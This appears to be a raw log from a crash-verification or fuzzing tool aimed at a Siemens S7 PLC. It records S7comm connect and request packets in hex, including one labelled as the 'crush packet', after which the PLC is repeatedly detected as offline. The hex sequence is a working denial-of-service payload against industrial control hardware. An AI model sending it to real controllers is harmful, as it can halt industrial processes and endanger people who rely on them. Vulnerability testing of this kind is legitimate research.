[2021-12-19 20:38:58,708] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d100000800080001120411440100ff090004001c0000
[2021-12-19 20:38:58,722] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:38:58,911] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:39:10,948] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:39:10,949] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 99 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:39:19,265] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:39:19,299] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000d20000080000f000000a000a00f0
[2021-12-19 20:39:19,300] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f08032030000d200000800000000f0000003000300f0
[2021-12-19 20:39:23,300] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:39:23,300] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 39
[2021-12-19 20:39:23,303] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d300000800080001120411440100ff090004001c0000
[2021-12-19 20:39:23,528] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d400000800080001120411440100ff090004001c0000
[2021-12-19 20:39:23,742] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d500000800080001120411440100ff090004001c0000
[2021-12-19 20:39:23,945] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d600000800080001120411440100ff090004001c0000
[2021-12-19 20:39:24,149] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d700000800080001120411440100ff090004001c0000
[2021-12-19 20:39:24,355] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d800000800080001120411440100ff090004001c0000
[2021-12-19 20:39:24,561] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d900000800080001120411440100ff090004001c0000
[2021-12-19 20:39:24,765] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000da00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:24,971] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000db00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:25,176] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dc00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:25,385] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dd00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:25,589] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000de00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:25,793] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000df00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:25,998] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e000000800080001120411440100ff090004001c0000
[2021-12-19 20:39:26,202] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e100000800080001120411440100ff090004001c0000
[2021-12-19 20:39:26,405] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e200000800080001120411440100ff090004001c0000
[2021-12-19 20:39:26,612] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e300000800080001120411440100ff090004001c0000
[2021-12-19 20:39:26,816] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e400000800080001120411440100ff090004001c0000
[2021-12-19 20:39:27,020] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e500000800080001120411440100ff090004001c0000
[2021-12-19 20:39:27,225] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e600000800080001120411440100ff090004001c0000
[2021-12-19 20:39:27,431] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e700000800080001120411440100ff090004001c0000
[2021-12-19 20:39:27,648] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e800000800080001120411440100ff090004001c0000
[2021-12-19 20:39:27,853] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e900000800080001120411440100ff090004001c0000
[2021-12-19 20:39:28,058] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ea00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:28,262] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000eb00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:28,468] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ec00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:28,673] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ed00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:28,880] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ee00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:29,084] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ef00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:29,288] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f000000800080001120411440100ff090004001c0000
[2021-12-19 20:39:29,495] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f100000800080001120411440100ff090004001c0000
[2021-12-19 20:39:29,702] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f200000800080001120411440100ff090004001c0000
[2021-12-19 20:39:29,904] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f300000800080001120411440100ff090004001c0000
[2021-12-19 20:39:30,110] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f400000800080001120411440100ff090004001c0000
[2021-12-19 20:39:30,316] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f500000800080001120411440100ff090004001c0000
[2021-12-19 20:39:30,521] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f600000800080001120411440100ff090004001c0000
[2021-12-19 20:39:30,727] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f700000800080001120411440100ff090004001c0000
[2021-12-19 20:39:30,934] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f800000800080001120411440100ff090004001c0000
[2021-12-19 20:39:31,140] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f900000800080001120411440100ff090004001c0000
[2021-12-19 20:39:31,612] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:39:31,614] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f08032010000fa00000e00000401120a10010003000083000001
[2021-12-19 20:39:31,816] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fb00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:32,022] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fc00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:32,228] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fd00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:32,434] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fe00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:32,641] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ff00000800080001120411440100ff090004001c0000
[2021-12-19 20:39:32,846] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000001000800080001120411440100ff090004001c0000
[2021-12-19 20:39:33,049] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000101000800080001120411440100ff090004001c0000
[2021-12-19 20:39:33,256] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000201000800080001120411440100ff090004001c0000
[2021-12-19 20:39:33,463] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000301000800080001120411440100ff090004001c0000
[2021-12-19 20:39:33,670] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000401000800080001120411440100ff090004001c0000
[2021-12-19 20:39:33,875] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000501000800080001120411440100ff090004001c0000
[2021-12-19 20:39:34,079] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000601000800080001120411440100ff090004001c0000
[2021-12-19 20:39:34,283] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000701000800080001120411440100ff090004001c0000
[2021-12-19 20:39:34,491] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000801000800080001120411440100ff090004001c0000
[2021-12-19 20:39:34,694] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000901000800080001120411440100ff090004001c0000
[2021-12-19 20:39:34,898] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:35,103] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:35,310] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:35,516] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:35,723] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:35,930] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:36,133] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001001000800080001120411440100ff090004001c0000
[2021-12-19 20:39:36,335] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001101000800080001120411440100ff090004001c0000
[2021-12-19 20:39:36,541] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001201000800080001120411440100ff090004001c0000
[2021-12-19 20:39:36,747] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001301000800080001120411440100ff090004001c0000
[2021-12-19 20:39:36,952] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001401000800080001120411440100ff090004001c0000
[2021-12-19 20:39:37,157] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001501000800080001120411440100ff090004001c0000
[2021-12-19 20:39:37,360] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001601000800080001120411440100ff090004001c0000
[2021-12-19 20:39:37,565] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001701000800080001120411440100ff090004001c0000
[2021-12-19 20:39:37,768] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001801000800080001120411440100ff090004001c0000
[2021-12-19 20:39:37,976] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001901000800080001120411440100ff090004001c0000
[2021-12-19 20:39:38,179] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:38,386] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:38,593] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:38,799] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:39,004] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:39,206] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f01000800080001120411440100ff090004001c0000
[2021-12-19 20:39:39,412] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002001000800080001120411440100ff090004001c0000
[2021-12-19 20:39:39,615] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002101000800080001120411440100ff090004001c0000
[2021-12-19 20:39:39,726] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:39:39,819] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:39:51,866] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:39:51,867] [INFO] [vertifyPassiveARP.<module>] -> No: 3, sended packets 79 ,passiveDetected find a Crush, The activeDetect ans is Crush
